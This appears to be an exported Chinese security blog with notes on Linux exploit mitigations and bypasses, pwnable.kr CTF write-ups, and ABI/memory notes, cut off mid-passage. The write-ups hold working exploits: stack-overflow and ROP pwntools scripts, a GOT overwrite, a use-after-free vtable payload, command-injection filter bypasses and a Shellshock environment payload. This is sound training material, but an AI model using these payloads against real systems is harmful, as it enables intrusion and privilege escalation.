随机粒度为0x1000相当于一个内存页的大小 file命令查看时会显示为so文件 随机化ELF装载内存的基址（代码段、plt、got、data等共同的基址） 不开启ASLR的话，PIE本身也不会起作用 glibc/elf/dl-load.ccall有相对地址和绝对地址两种，目前测试不论是否开启了pie使用相对地址进行call$ -no-pie # close$ -pie -fpie # open进程空间分布图Stack Canary/Stack Cookie函数序言部分插入随机值，在返回时检查该值。同一个进程中的不同线程的Cannary是相同的，并且通过fork函数创建的子进程中的canary也是相同的，因为fork函数会直接拷贝父进程的内存。$ -fno-stack-protector # close$ -fstack-protector # open only for functions with char type local var$ -fsatck-protector-all # open for all functionsNX/W^X/DEP 历史 Alexander给出了一个linux补丁(1997)：实现了栈不可执行 Pax研究组提出了W^X(2000)：更细粒度的保护 RedHat Linux ExecShield，Windows DEP(2004) NX被绕过；Return-to-libc/ROP(代码重用攻击) 开启该保护后可写与可执行变不可兼得，值得注意的是只读数据仍是可执行的。$ -z execstack # close$ -z noexecstack # openFortify用于防止格式化字符串漏洞，包含%n的格式化字符串不能位于程序内存中的可写地址。当使用位置参数时，必须使用范围内的所有参数，如果要使用%7$x必须同时使用1$,2$,3$,4$,5$,6$$ -D_FORTIFY_SOURCE=0 # close$ -D_FORTIFY_SOURCE=2 # openRelocation Read Only(RELRO)在进入main()之前，所有外部函数会被解析，所有GOT表项设置为只读。$ -z lazy # partly open$ -z now # full openSupervisor Mode Execution Protection(SMEP)管理模式执行保护，如果处理器处于ring0模式，并试图执行有user数据的内存时，就会触发也错误，保护内核使其不允许执行用户空间代码seccompseccomp是一种内核中的安全机制，正常情况下，程序可以使用所有的syscall,这是不安全的，比如程序劫持程序流后通过execve的syscall来getshell。通过seccomp我们可以在程序中禁用掉某些syscall，这就就算劫持了程序流也只能调用部分的syscall了绕过手段ASLR绕过 未开启PIE，Return to PLT，可绕过共享库随机化 x86-64架构下，内存地址随机化粒度以页为单位，0x1000字节对齐 信息泄露 在shellcode之前布置一长串nop指令(nop sled) 堆喷(heap spray) 本地环境小技巧：ulimit -s unlimited ASLR早于PIE，所以有return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等绕过ASLR的技术，在ASLR+PIE之后，这些bypass技术就都失效了，只能借助其他的信息泄露漏洞泄露基址（常用libc基址）NX/W^X/DEP绕过 复用libc中大量函数，或者程序已有的GadgetCanary绕过 泄露Canary，每个线程不同函数的Canary都相同 只覆盖局部变量，不覆盖返回地址 修改Thread-local Storage中的Canary Windows下Canary = __security_cookie^ebp one-by-one爆破 Canary失败后会调用__stack_chk_fail函数，通过劫持GOT表可以直接提权(ZCTF2017/Login) Canary 储存在TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的Canary和TLS储存的Canary实现绕过。(StarCTF2018/babystack) Canary设计为以字节\\x00结尾，本意是为了保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。 当canary被覆盖之后，会call__stack_chk_fail打印argv[0]指向的字符串，默认是程序的名字，覆盖为其他的地址则可以任意地址泄露reference Linux seccomp机制 深度剖析 Linux 共享库的“位置无关”实现原理 APP漏洞扫描用地址空间随机化 x86/x64 Call Jmp 指令区别 Linux中的保护机制 CTF-pwn 技术总结（3）" }, { "title": "pwnable.kr刷题[Toddler's Bottle(16/21)]", "url": "/posts/pwnable.kr%E5%88%B7%E9%A2%982/", "categories": "CTF, Exercise", "tags": "pwnable", "date": "2022-08-30 10:10:00 +0800", "snippet": "coin1简单的二分法，学习一下正则表达式，以后可以更好处理这种格式化输入的情况。远程连接延迟较高，上传到本地后执行root@HeFeng:~/pwn-workplace# scp -P 2222 ./hack.py horcruxes@pwnable.kr:/tmphorcruxes@pwnable.kr's password:hack.py 100% 700 3.0KB/s 00:00from pwn import *context.log_level = 'debug'io = remote(\"localhost\", 9007)io.recvuntil(\"- Ready? starting in 3 sec... -\\n\\t\\n\")for _ in range(100): try: N, C = map(int, re.findall(r\"\\d+\", io.recv().decode(\"utf-8\"))) left, right = 0, N - 1 for _ in range(C): mid = (left + right) // 2 io.sendline(\" \".join([str(i) for i in range(left, mid)])) sum = int(io.recvline().decode(\"utf-8\")) if sum % 10 == 0: left = mid else: right = mid io.sendline(str(left)) io.recvline() except: print(\"error\") breakprint(io.recvline())print(io.recvline())blackjackbetting对赌注的判定不严谨，一方面第二次判断的时候没有和cash比较，另一方面没有过滤负数。直接用-1000000做赌注输掉即可int betting() //Asks user amount to bet{ printf(\"\\n\\nEnter Bet: $\"); scanf(\"%d\", &amp;bet); if (bet &gt; cash) //If player tries to bet more money than player has { printf(\"\\nYou cannot bet more money than you have.\"); printf(\"\\nEnter Bet: \"); scanf(\"%d\", &amp;bet); return bet; } else return bet;} // End Functionlotto嵌套的for循环比较会大幅提高命中率，我们输入6个一样的字符，只需要猜中任何一位即可，这个概率约为1-(44/45)^6。#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play(){ int i; printf(\"Submit your 6 lotto bytes : \"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i&lt;6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++){ for(j=0; j&lt;6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); }}void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\");}int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", &amp;menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0;}cmd1过滤规则不完善，./cmd1 \"/bin/cat /home/cmd1/*\"即可。参考了网上的答案./cmd1 \"/bin/cat /home/cmd1/f*\"更高效。这题也可以先写一个脚本，然后利用cmd1去执行。要注意的是/tmp目录下可以写入新文件，~/cmd1目录不允许新建文件。除此之外这题也学习了putenv函数，由于修改了PATH=/thankyouverymuch，所以直接使用cat命令会显示找不到。根据生命周期分可分为永久性和临时性。永久的需要修改相关配置文件，变量永久生效；临时的是用户利用export命令，在当前终端下声明环境变量，关闭shell终端，则变量失效。#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, \"flag\")!=0; r += strstr(cmd, \"sh\")!=0; r += strstr(cmd, \"tmp\")!=0; return r;}int main(int argc, char* argv[], char** envp){ putenv(\"PATH=/thankyouverymuch\"); if(filter(argv[1])) return 0; system( argv[1] ); return 0;}“”(双引)：”$”,”`”,”\\”都按特殊字符解析，不按字母意思解析，”\\$vlocal”指的是变量值”(单引)字符解析，没有特殊含义“(反引)内容解析为系统命令；同$()\\(反斜)屏蔽下一个字符的特殊含义$:传递到脚本中的参数个数?:0个或1个在其之前的那个普通字符*:0个或多个之前的那个普通字符+:1个或多个之前的那个普通字符^:行首$:命令退出状态，0无，非0有|:管道；或cmd2ssh连接密码：mommy now I get what PATH environment is for :)过滤规则更严，可以考虑用ascii代替/。直接使用./cmd2 '\\\\057bin\\\\057cat fl\"\"ag'无法在system运行时转换成/cmd2@pwnable:~$ ./cmd2 '$(printf \\\\057bin\\\\057cat) fl\"\"ag'$(printf \\\\057bin\\\\057cat) fl\"\"agFuN_w1th_5h3ll_v4riabl3s_haha看到了执行脚本的另一种绕过方法，当前目录切换到/的时侯$(pwd)就是//home/cmd2/cmd2 '$(pwd)tmp$(pwd)p4nda'#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){ int r=0; r += strstr(cmd, \"=\")!=0; r += strstr(cmd, \"PATH\")!=0; r += strstr(cmd, \"export\")!=0; r += strstr(cmd, \"/\")!=0; r += strstr(cmd, \"`\")!=0; r += strstr(cmd, \"flag\")!=0; return r;}extern char** environ;void delete_env(){ char** p; for(p=environ; *p; p++) memset(*p, 0, strlen(*p));}int main(int argc, char* argv[], char** envp){ delete_env(); putenv(\"PATH=/no_command_execution_until_you_become_a_hacker\"); if(filter(argv[1])) return 0; printf(\"%s\\n\", argv[1]); system( argv[1] ); return 0;}uaf释放后没有清空指针，又因为case2会重新申请chunk所以可以控制case1执行的函数执行case1的逻辑如下 将rbp-0x38处的堆地址放入rax 读取该堆地址0偏移处的值放入rax 调用rax偏移0x8处函数简单而言就是堆上内存指向的虚函数表会被调用，可以发现give_shell和introduce两个虚函数仅相差0x8偏移量。我们修改堆上函数表的地址，使其向前指0x8个字节即可需要注意的是fastbin先进后出，所以要调用case2两次覆盖m虚函数表地址才不会导致段错误loc_400FCD:mov rax, [rbp+var_38]mov rax, [rax]add rax, 8mov rdx, [rax]mov rax, [rbp+var_38]mov rdi, raxcall rdxmov rax, [rbp+var_30]mov rax, [rax]add rax, 8mov rdx, [rax]mov rax, [rbp+var_30]mov rdi, raxcall rdxjmp loc_4010A9pwndbg&gt; x/16x $rbp-0x380x7ffefe402978: 0x01bcbee0 0x00000000 0x01bcbf30 0x000000000x7ffefe402988: 0x004013b0 0x00000000 0x00000000 0x000000000x7ffefe402998: 0x00000000 0x00000000 0x004013b0 0x000000000x7ffefe4029a8: 0x00400de0 0x00000000 0x00000000 0x00000000pwndbg&gt; x/16x 0x1bcbee00x1bcbee0: 0x00401570 0x00000000 0x00000019 0x000000000x1bcbef0: 0x01bcbec8 0x00000000 0x00000031 0x000000000x1bcbf00: 0x00000004 0x00000000 0x00000004 0x000000000x1bcbf10: 0x00000000 0x00000000 0x6c6c694a 0x00000000pwndbg&gt; x/16x 0x4015700x401570 &lt;_ZTV3Man+16&gt;: 0x0040117a 0x00000000 0x004012d2 0x000000000x401580 &lt;_ZTV5Human&gt;: 0x00000000 0x00000000 0x004015f0 0x000000000x401590 &lt;_ZTV5Human+16&gt;: 0x0040117a 0x00000000 0x00401192 0x000000000x4015a0 &lt;_ZTS5Woman&gt;: 0x6d6f5735 0x00006e61 0x00000000 0x00000000uaf@pwnable:~$ python -c 'print \"\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00\"' &gt; /tmp/hackuaf@pwnable:~$ ./uaf 8 /tmp/hack1. use2. after3. free31. use2. after3. free2your data is allocated1. use2. after3. free2your data is allocated1. use2. after3. free1$ cat flagyay_f1ag_aft3r_pwning#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human{private: virtual void give_shell(){ system(\"/bin/sh\"); }protected: int age; string name;public: virtual void introduce(){ cout &lt;&lt; \"My name is \" &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; \"I am \" &lt;&lt; age &lt;&lt; \" years old\" &lt;&lt; endl; }};class Man: public Human{public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; \"I am a nice guy!\" &lt;&lt; endl; }};class Woman: public Human{public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; \"I am a cute girl!\" &lt;&lt; endl; }};int main(int argc, char* argv[]){ Human* m = new Man(\"Jack\", 25); Human* w = new Woman(\"Jill\", 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; \"1. use\\n2. after\\n3. free\\n\"; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; \"your data is allocated\" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0;}blukat这题侧重点在用户权限上，虽然代码里有栈溢出，但貌似不太好利用。可以看到password文件属于blukat_pwn组，组内拥有读权限。而当前用户属于blukat_pwn组，所以可以顺利读取password内容blukat@pwnable:~$ ls -ltotal 20-r-xr-sr-x 1 root blukat_pwn 9144 Aug 8 2018 blukat-rw-r--r-- 1 root root 645 Aug 8 2018 blukat.c-rw-r----- 1 root blukat_pwn 33 Jan 6 2017 passwordblukat@pwnable:~$ iduid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)这里比较迷惑的是password内容本身就是Permission denied，容易上当。blukat@pwnable:~$ cat passwordcat: password: Permission deniedblukat@pwnable:~$ ./blukatguess the password!cat: password: Permission deniedcongrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!horcruxesgets会被换行符和文件结束符截断，所以返回地址中出现’\\x0a’的话就无法进行后续的覆盖。本题中ropme地址0x80a0009和获取flag的地址0x80a0160均含有截断符号，所以采取了0x809fffc处的call ropme指令完成跳转。整个rop链的逻辑就是先跳转到7个输出函数获取随机数值，计算出sum后在ropme内输入即可。另外程序中的atoi函数会将超过int的数值直接转化为-1，所以python脚本有时候会失败，没有对sum取余from pwn import *context.log_level = 'debug'io = remote(\"0\", 9032)elf = ELF(\"/home/horcruxes/horcruxes\")io.sendlineafter(\"Menu:\", \"1\")payload = b'a' * 0x74 + p32(0xdeadbeef)payload += p32(elf.symbols['A'])payload += p32(elf.symbols['B'])payload += p32(elf.symbols['C'])payload += p32(elf.symbols['D'])payload += p32(elf.symbols['E'])payload += p32(elf.symbols['F'])payload += p32(elf.symbols['G'])payload += p32(0x809fffc)io.sendlineafter(\"earned? : \", payload)io.recvuntil(\"kill Voldemort\\n\")sum = 0for _ in range(7): sum += int(re.findall(\"\\+(.\\w+)\", str(io.recvline()))[0])print(sum)io.sendlineafter(\"Menu:\", \"1\")io.sendlineafter(\"earned? : \", str(sum))io.interactive()" }, { "title": "pwnable.kr刷题[Toddler's Bottle(8/21)]", "url": "/posts/pwnable.kr%E5%88%B7%E9%A2%98/", "categories": "CTF, Exercise", "tags": "pwnable", "date": "2022-08-28 10:10:00 +0800", "snippet": "fdlinux下文件描述符有下列三个特殊值 stdin stdout stderr 0 1 2 输入argv[1]为0x1234即可开启read(0, buf, 32);之后程序会将我们在命令行输入的LETMEWIN读进buf#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0;}collision很简单的漏洞，但是python3写的pwntools好像不能用？#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;}int main(int argc, char* argv[]){ if(argc&lt;2){ printf(\"usage : %s [passcode]\\n\", argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\"passcode length should be 20 bytes\\n\"); return 0; } if(hashcode == check_password( argv[1] )){ system(\"/bin/cat flag\"); return 0; } else printf(\"wrong passcode.\\n\"); return 0;}$ ./col `python -c 'print \"\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\"'`from pwn import *context.log_level = 'debug'io = ssh(user = \"col\", host = \"pwnable.kr\", port = 2222, password = \"guest\")payload = p32(0x01010101)*4 + p32(0x1DD905E8)io.connected()io.process(argv=['col', payload], executable='./col')print(io.recvall())bof基础栈溢出，计算好偏移量#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){\tchar overflowme[32];\tprintf(\"overflow me : \");\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe){\t\tsystem(\"/bin/sh\");\t}\telse{\t\tprintf(\"Nah..\\n\");\t}}int main(int argc, char* argv[]){\tfunc(0xdeadbeef);\treturn 0;}from pwn import *context.log_level = 'debug'io = remote(\"pwnable.kr\", 9000)payload = b'a' * 0x2c + p32(0xcafebabe) * 3io.sendline(payload)io.interactive()flagstrings flag看到upx字样，可以判断使用upx壳upx -d flag脱壳之后使用gdb调试即可获得flagpasscodewelcome写在栈上的内容没有清空，覆盖到passcode。scanf的时候没有&amp;，导致可以任意写向passcode指向的空间。通过向got表写入system(“/bin/cat flag”)地址完成利用#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); }}void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name);}int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0;}from pwn import *context.log_level = 'debug'#io = remote(\"pwnable.kr\", 9000)io = process(\"./passcode\")io = ssh(user=\"passcode\", host=\"pwnable.kr\", port=2222, password=\"guest\")elf = ELF(\"./passcode\")bin = io.process(\"./passcode\")scanf_got = elf.got['printf']backdoor_addr = 0x80485e3payload = b'a' * 96 + p32(scanf_got)bin.send(payload)bin.recvuntil(\"Welcome\")payload = str(backdoor_addr).encode()bin.sendline(payload)bin.sendline(payload)print(bin.recvall())random没设置种子，产生的rand()值就会一样#include &lt;stdio.h&gt;int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", &amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0;}from pwn import *import ctypescontext.log_level = 'debug'dll = ctypes.CDLL(\"/usr/lib/x86_64-linux-gnu/libc.so.6\")key = dll.random() ^ 0xdeadbeefio = ssh(user=\"random\", host=\"pwnable.kr\", port=2222, password=\"guest\")bin = io.process(\"./random\")bin.sendline(str(key).encode())print(bin.recvall())mistakefd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0比较运算符优先级高，fd=0即stdin，所以读取的密钥是自己输入的。#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len){ int i; for(i=0; i&lt;len; i++){ s[i] ^= XORKEY; }}int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0;}shellshockCVE-2014-6271以() {开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。#include &lt;stdio.h&gt;int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c 'echo shock_me'\"); return 0;}shellshock@pwnable:~$ env 'x=() { :;}; bash -c \"cat flag\"' ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)shellshock@pwnable:~$ export 'x=() { :;}; bash -c \"cat flag\"'shellshock@pwnable:~$ envXDG_SESSION_ID=6588TERM=xterm-256colorSHELL=/bin/bashSSH_CLIENT=111.199.68.236 39058 2222SSH_TTY=/dev/pts/9USER=shellshockMAIL=/var/mail/shellshockPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binPWD=/home/shellshockLANG=en_US.UTF-8SHLVL=1HOME=/home/shellshockLOGNAME=shellshockXDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktopSSH_CONNECTION=111.199.68.236 39058 128.61.240.205 2222x=() { :;}; bash -c \"cat flag\"XDG_RUNTIME_DIR=/run/user/1019_=/usr/bin/envshellshock@pwnable:~$ ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault (core dumped)" }, { "title": "应用程序二进制接口", "url": "/posts/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%8E%A5%E5%8F%A3/", "categories": "Linux, Basic", "tags": "abi", "date": "2022-08-17 10:10:00 +0800", "snippet": "内存对齐内存对齐”应该是编译器的“管辖范围”。编译器为程序中的每个“数据单元”安排在适当的位置上。以便CPU一个步长(一字节)快速搜索。一般体现在结构体和类上。 对齐原因 平台原因(移植原因): 不是所有的硬件平台都能访问任意地址上的任意数据的；某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。 性能原因: 数据结构(尤其是栈)应该尽可能地在自然边界上对齐。原因在于，为了访问未对齐的内存，处理器需要作两次内存访问；而对齐的内存访问仅需要一次访问。 对齐系数 每个特定平台上的编译器都有自己的默认“对齐系数”(也叫对齐模数)。程序员可以通过预编译命令#pragma pack(n)，n=1,2,4,8,16来改变这一系数，其中的n就是你要指定的“对齐系数”。 对齐规则 按照成员的声明顺序，依次安排内存，如果紧接着插入的成员使得当前步长爆满，则在下一个步长起始地址放入该成员。使得CPU不会进行两个步长来读取数据。常见指令 call = push retaddr + jmp leave = mov rsp,rbp + pop rbp ret = pop ripintel语法与AT&amp;T语法linux通常使用AT&amp;T语法 操作数顺序 寄存器记法 立即数记法 访存寻址记法 操作码助记符 Intel AT&amp;T mov eax,8 movl $8,%eax mov ebx,0ffffh movl $0xffff,%ebx int 80h int $80 mov eax,[ecx] movl (%ecx),%eax ABI应用程序二进制接口通常由调用约定和名称重整两大部分组成，描述了二进制层面保持兼容性的规则。 Microsoft’s x64 ABI 前4个参数通过寄存器 RCX、RDX、R8、R9 传递，在栈上会预留下 0x20 字节的空间用于临时保存前 4 个参数，返回值为 RAX。 SysV x64 ABI 前6个参数 RDI、RSI、RDX、RCX、R8、R9 通过寄存器传递，返回值为RAX寄存器。调用约定(calling convention) 实现了层面（底层）的规范 约定了函数之间如何传递参数 约定了函数如何传递返回值 修饰名 调用者负责清理栈上的参数(Caller Clean-up) cdecl optlink 被调用者负责清理栈上的参数(Callee Clean-up) stdcall fastcall 调用约定的声明 参数入栈顺序 恢复栈平衡的位置 _cdecl 右→左 母函数 _fastcall 右→左 子函数 _stdcall 右→左 子函数 #include&lt;stdio.h&gt;__attribute__((__stdcall__)) int func(int a, int b) { int c = 1; c = a + b; return c;}int main() { int ret = func(1, 2);}cdecl000011ad &lt;func&gt;: 11ad: f3 0f 1e fb endbr32 11b1: 55 push %ebp 11b2: 89 e5 mov %esp,%ebp 11b4: 83 ec 10 sub $0x10,%esp... 11d6: c9 leave 11d7: c3 ret000011d8 &lt;main&gt;:... 11ec: 6a 02 push $0x2 11ee: 6a 01 push $0x1 11f0: e8 b8 ff ff ff call 11ad &lt;func&gt; 11f5: 83 c4 08 add $0x8,%esp 11f8: 89 45 fc mov %eax,-0x4(%ebp) 11fb: b8 00 00 00 00 mov $0x0,%eax 1200: c9 leave 1201: c3 retstdcall000011ad &lt;func&gt;: 11ad: f3 0f 1e fb endbr32 11b1: 55 push %ebp 11b2: 89 e5 mov %esp,%ebp 11b4: 83 ec 10 sub $0x10,%esp... 11d6: c9 leave 11d7: c2 08 00 ret $0x8000011da &lt;main&gt;: 11da: f3 0f 1e fb endbr32... 11ee: 6a 02 push $0x2 11f0: 6a 01 push $0x1 11f2: e8 b6 ff ff ff call 11ad &lt;func&gt; 11f7: 89 45 fc mov %eax,-0x4(%ebp) 11fa: b8 00 00 00 00 mov $0x0,%eax 11ff: c9 leave 1200: c3 retfastcall000011ad &lt;func&gt;: 11ad: f3 0f 1e fb endbr32 11b1: 55 push %ebp 11b2: 89 e5 mov %esp,%ebp 11b4: 83 ec 18 sub $0x18,%esp... 11dc: c9 leave 11dd: c3 ret000011de &lt;main&gt;:... 11f2: ba 02 00 00 00 mov $0x2,%edx 11f7: b9 01 00 00 00 mov $0x1,%ecx 11fc: e8 ac ff ff ff call 11ad &lt;func&gt; 1201: 89 45 fc mov %eax,-0x4(%ebp) 1204: b8 00 00 00 00 mov $0x0,%eax 1209: c9 leave 120a: c3 ret堆栈平衡不平衡会引起内存泄漏，影响性能。外平衡是由调用者维持自身的堆栈平衡，内平衡是由被调用者维持调用者的堆栈平衡。除此之外，我们还可能见到一种指令集的堆栈平衡。movaps要求地址16字节对齐，在64位的system中使用该语句要求栈地址16字节对齐，这有时会导致system(“/bin/sh”)失败，详见引用5。函数序言(Function Prologue)push ebpmov ebp,espsub esp,X函数尾声(Function Epilogue)mov eax,Xmov esp,ebppop ebpret调用方式 Language C SysCall StdCall BASIC FORTRAN PASCAL   参数入栈顺序 右→左 右→左 右→左 左→右 左→右 左→右 左→右 恢复栈平衡操作的位置 母函数 子函数 子函数 子函数 子函数 子函数   名称重整(name mangle)Name mangling 是 C++ 引入的概念，其核心思想是把函数的名字、参数等信息（或者叫函数签名）编码成一个具有唯一性的字符串，用作链接符号；这样就能在编译期完成检查，从而避免运行时出问题。系统调用 linux系统调用号实际上定义在/usr/include/asm/unistd_32.h和/usr/include/asm/unistd_64.h中。 x64使用rax传递系统调用号，x64使用rdi/rsi/rdx传递前三个参数，x86使用eax传递系统调用好，x86使用ebx/ecx/edx传递参数。 系统调用x64使用“syscall”，x86使用“int 80”分析工具 GCC and MSVC C++ Demangler 解析符号对应的函数Reference Linux Foundation Referenced Specifications 你们说的ABI，Application Binary Interface到底是什么东西？ 什么是应用程序二进制接口ABI 堆栈平衡 CTF 栈溢出题100步getshell之就差一步——The MOVAPS issue" }, { "title": "进程空间", "url": "/posts/%E8%BF%9B%E7%A8%8B%E7%A9%BA%E9%97%B4/", "categories": "Linux, Basic", "tags": "memory", "date": "2022-08-16 22:10:00 +0800", "snippet": "寻址模式 立即数寻址：操作数包含在指令中，紧跟在操作码之后，作为指令一部分 寄存器寻址：操作数在寄存器中，指令指定寄存器 直接内存寻址：操作数在内存中，指令指定内存地址 寄存器间接寻址：操作数在内存中，操作数的地址在寄存器中 索引寻址：通过基址寄存器加上一个索引值来寻址内存中的数据 相对基址索引寻址：通过基址寄存器加上变址寄存器再加上偏移量来寻址内存中数据 比例寻址变址：通过基址寄存器加上变址寄存器与比例因子的乘积来寻址内存中数据[ebx+4*ecx]地址分类x86-linux采取段页式内存管理技术，涉及三种地址。 逻辑地址(Logical Address) 是指由程式产生的和段相关的偏移地址部分。例如，你在进行C语言指针编程中，能读取指针变量本身值(&amp;操作)，实际上这个值就是逻辑地址，他是相对于你当前进程数据段的地址，不和绝对物理地址相干。只有在Intel实模式下，逻辑地址才和物理地址相等（因为实模式没有分段或分页机制,Cpu不进行自动地址转换）逻辑也就是在Intel保护模式下程式执行代码段限长内的偏移地址（假定代码段、数据段如果完全相同）。应用程式员仅需和逻辑地址打交道，而分段和分页机制对你来说是完全透明的，仅由系统编程人员涉及。应用程式员虽然自己能直接操作内存，那也只能在操作系统给你分配的内存段操作。 线性地址(Linear Address) 是逻辑地址到物理地址变换之间的中间层。程式代码会产生逻辑地址，或说是段中的偏移地址，加上相应段的基地址就生成了一个线性地址。如果启用了分页机制，那么线性地址能再经变换以产生一个物理地址。若没有启用分页机制，那么线性地址直接就是物理地址。Intel 80386的线性地址空间容量为4G（2的32次方即32根地址总线寻址）。 物理地址(Physical Address) 是指出目前CPU外部地址总线上的寻址物理内存的地址信号，是地址变换的最终结果地址。进程空间结构体 /include/linux/mm_types.h内核使用内存描述符来表示进程的地址空间，该描述符表示着进程所有地址空间的信息，通过task_struct可以索引到该结构体。其中start_code等表示了内存空间的分布。struct mm_struct {\tstruct vm_area_struct * mmap;\t\t/* list of VMAs */\tstruct rb_root mm_rb;\tstruct vm_area_struct * mmap_cache;\t/* last find_vma result */ ...\tunsigned long mmap_base;\t\t/* base of mmap area */\tunsigned long task_size;\t\t/* size of task vm space */\tunsigned long cached_hole_size; \t/* if non-zero, the largest hole below free_area_cache */\tunsigned long free_area_cache;\t\t/* first hole of size cached_hole_size or larger */ ...\tunsigned long hiwater_rss;\t/* High-watermark of RSS usage */\tunsigned long hiwater_vm;\t/* High-water virtual memory usage */\tunsigned long total_vm;\t\t/* Total pages mapped */\tunsigned long locked_vm;\t/* Pages that have PG_mlocked set */\tunsigned long pinned_vm;\t/* Refcount permanently increased */\tunsigned 